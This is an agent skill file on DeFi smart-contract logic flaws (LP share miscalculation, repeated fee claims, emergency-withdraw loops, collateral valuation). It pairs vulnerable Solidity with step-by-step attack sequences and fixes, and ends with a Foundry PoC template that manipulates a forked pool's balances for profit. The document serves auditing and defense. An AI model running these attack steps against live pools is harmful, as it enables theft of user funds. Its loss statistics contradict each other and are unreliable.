---
name: logic-flaw-vulnerability
description: Logic flaw vulnerability analysis covering 39 real cases with $109M total loss. Use when analyzing LP share calculation errors, reward distribution bugs, emergency withdrawal flaws, or collateral valuation errors. Includes attack patterns for share manipulation, reward exploitation, and PoC templates for logic flaw attacks.
---

# Logic Flaw 漏洞分析

## 快速识别

### 核心特征
- ✓ LP 份额计算使用 `balanceOf()` 而非 `reserves`
- ✓ 奖励/费用领取缺少已领取记录
- ✓ 紧急提款不更新内部账户
- ✓ 抵押品估值使用可操纵的价格源
- ✓ 状态更新不一致或缺失

### 快速检查清单 (5 分钟)
- [ ] 检查 LP 份额计算是否使用 `balanceOf()`
- [ ] 验证奖励领取是否记录已领取状态
- [ ] 检查紧急提款是否更新所有相关状态
- [ ] 确认价格源是否可被操纵
- [ ] 验证状态更新的一致性

### 本质公式
```
逻辑缺陷 = 错误的核心算法 × 可重复利用 × 高价值目标
```

## 漏洞分类

### 主要类型

**A. LP Share Calculation Flaw (份额计算缺陷)** - 2.6%
- 使用 `balanceOf()` 而非 `reserves` 计算份额
- 典型案例: Spartan ($30.5M)

**B. Repeated Reward Claim (重复奖励领取)** - 2.6%
- 费用/奖励领取缺少已领取记录
- 典型案例: Popsicle ($20M)

**C. Emergency Withdraw Exploit (紧急提款漏洞)** - 2.6%
- 紧急提款不更新内部账户
- 典型案例: bEarn ($11M)

**D. Collateral Valuation Error (抵押品估值错误)** - 多个子类型
- 价格操纵、清算逻辑缺陷等
- 典型案例: HedgeyFinance ($48M)


## 核心攻击模式

### 模式 1: LP 份额操纵

```solidity
// ❌ 漏洞代码
function calcLiquidityShare(uint256 amount) public view returns (uint256) {
    uint256 baseAmount = baseToken.balanceOf(address(this));  // 可操纵
    uint256 tokenAmount = token.balanceOf(address(this));     // 可操纵
    return amount * totalSupply / (2 * baseAmount + tokenAmount);
}

// 攻击步骤
// 1. 多次 swap 改变池子状态
// 2. 添加流动性获得 LP 份额
// 3. 捐赠代币操纵 balanceOf()
// 4. 移除流动性提取超额资产
```

### 模式 2: 重复奖励领取

```solidity
// ❌ 漏洞代码
function collectFees(uint256 amount0, uint256 amount1) external {
    uint256 lpBalance = balanceOf(msg.sender);
    uint256 fees0 = calculateFees0(lpBalance);
    uint256 fees1 = calculateFees1(lpBalance);
    
    // 缺少：记录已领取的费用
    token0.transfer(msg.sender, fees0);
    token1.transfer(msg.sender, fees1);
}

// 攻击步骤
// 1. 存入资产获得 LP 代币
// 2. 领取费用
// 3. 转移 LP 代币到另一地址
// 4. 新地址再次领取相同费用
// 5. 重复步骤 3-4 多次
```

### 模式 3: 紧急提款循环

```solidity
// ❌ 漏洞代码
function emergencyWithdraw(uint256 pid) external {
    PoolInfo storage pool = poolInfo[pid];
    UserInfo storage user = userInfo[pid][msg.sender];
    
    // 转移代币但不更新 user.amount
    pool.lpToken.safeTransfer(msg.sender, user.amount);
    
    emit EmergencyWithdraw(msg.sender, pid, user.amount);
    // 缺少：user.amount = 0;
}

// 攻击步骤
// 1. 使用闪电贷借入大量代币
// 2. 存入获得 LP 代币
// 3. 紧急提款（不更新状态）
// 4. 再次存入相同的 LP 代币
// 5. 再次紧急提款
// 6. 重复步骤 4-5 多次
```


## 关键防御

### 必须实施 (P0)

```solidity
// ✅ 使用 reserves 而非 balanceOf
function calcLiquidityShare(uint256 amount) public view returns (uint256) {
    (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
    return amount * totalSupply / (reserve0 + reserve1);
}

// ✅ 记录已领取的奖励
mapping(address => uint256) public claimedRewards;

function claimReward() external {
    uint256 totalReward = calculateReward(msg.sender);
    uint256 unclaimed = totalReward - claimedRewards[msg.sender];
    
    claimedRewards[msg.sender] = totalReward;
    rewardToken.transfer(msg.sender, unclaimed);
}

// ✅ 紧急提款更新所有状态
function emergencyWithdraw(uint256 pid) external {
    PoolInfo storage pool = poolInfo[pid];
    UserInfo storage user = userInfo[pid][msg.sender];
    
    uint256 amount = user.amount;
    user.amount = 0;  // 立即更新状态
    user.rewardDebt = 0;
    
    pool.lpToken.safeTransfer(msg.sender, amount);
    emit EmergencyWithdraw(msg.sender, pid, amount);
}
```

### 推荐实施 (P1)

```solidity
// ✅ 使用 TWAP 而非 spot price
function getPrice() public view returns (uint256) {
    return oracle.getTWAP(token, 30 minutes);
}

// ✅ 添加重入保护
modifier nonReentrant() {
    require(!locked, "Reentrant call");
    locked = true;
    _;
    locked = false;
}

// ✅ 限制操作频率
mapping(address => uint256) public lastActionTime;

function deposit() external {
    require(block.timestamp >= lastActionTime[msg.sender] + 1 hours, "Too frequent");
    lastActionTime[msg.sender] = block.timestamp;
    // 存款逻辑
}
```


## 典型案例

### 案例 1: HedgeyFinance (2024-04-19)
- **损失**: $48M
- **类型**: Collateral Valuation Error
- **根因**: 抵押品估值逻辑缺陷
- **PoC**: `src/test/2024-04/HedgeyFinance_exp.sol`

### 案例 2: Spartan (2021-05-01)
- **损失**: $30.5M
- **类型**: LP Share Calculation Flaw
- **根因**: 使用 `balanceOf()` 而非 `reserves` 计算份额

### 案例 3: Popsicle (2021-08-03)
- **损失**: $20M
- **类型**: Repeated Reward Claim
- **根因**: 通过转移 LP 代币重复领取费用


## PoC 快速模板

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract LogicFlawExploitTest is Test {
    address constant VICTIM_POOL = 0x...;
    address constant TOKEN0 = 0x...;
    address constant TOKEN1 = 0x...;
    
    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK_NUMBER - 1);
    }
    
    function testLPShareManipulation() public {
        // 1. 多次 swap 改变池子状态
        for (uint256 i = 0; i < 4; i++) {
            IERC20(TOKEN0).transfer(VICTIM_POOL, swapAmount);
            IPool(VICTIM_POOL).swap(TOKEN1, address(this));
        }
        
        // 2. 添加流动性
        IERC20(TOKEN0).transfer(VICTIM_POOL, amount0);
        IERC20(TOKEN1).transfer(VICTIM_POOL, amount1);
        IPool(VICTIM_POOL).addLiquidity();
        
        // 3. 捐赠代币操纵 balanceOf
        IERC20(TOKEN0).transfer(VICTIM_POOL, donateAmount);
        IERC20(TOKEN1).transfer(VICTIM_POOL, donateAmount);
        
        // 4. 移除流动性提取超额资产
        uint256 lpBalance = IPool(VICTIM_POOL).balanceOf(address(this));
        IPool(VICTIM_POOL).transfer(VICTIM_POOL, lpBalance);
        IPool(VICTIM_POOL).removeLiquidity();
        
        // 验证利润
        assertGt(IERC20(TOKEN0).balanceOf(address(this)), initialBalance);
    }
}
```


## 统计数据

| 指标 | 数值 |
|------|------|
| 案例数 | 39 |
| 总损失 | $109M |
| 平均损失 | $2.8M |
| 最大损失 | $48M (HedgeyFinance) |
| 高发年份 | 2021 (15 cases) |
| 主要链 | Ethereum, BSC, Polygon |

## 子类型分布

| 子类型 | 案例数 | 占比 | 代表案例 |
|--------|--------|------|----------|
| LP Share Calculation | 1 | 2.6% | Spartan |
| Repeated Reward Claim | 1 | 2.6% | Popsicle |
| Emergency Withdraw | 1 | 2.6% | bEarn |
| Collateral Valuation | 多个 | - | HedgeyFinance |
| 其他逻辑缺陷 | 35+ | 90%+ | 多个案例 |

## 相关资源

- 📖 [详细分析](../references/vulnerabilities/logic-flaw-detailed-analysis.md)
- 📊 [案例索引](../references/case-index.md#logic-flaw)
- 🎯 [VCAT 分类框架](../references/vcat-framework.md)
- 🔍 [IPDOR 分析框架](../references/ipdor-framework.md)
- 🛠️ [工具和资源](../references/tools-and-resources.md)

---

**版本**: v2.0 (优化版)  
**案例数**: 39  
**最后更新**: 2026-01-29  
**行数**: ~250 (优化前: 2303)
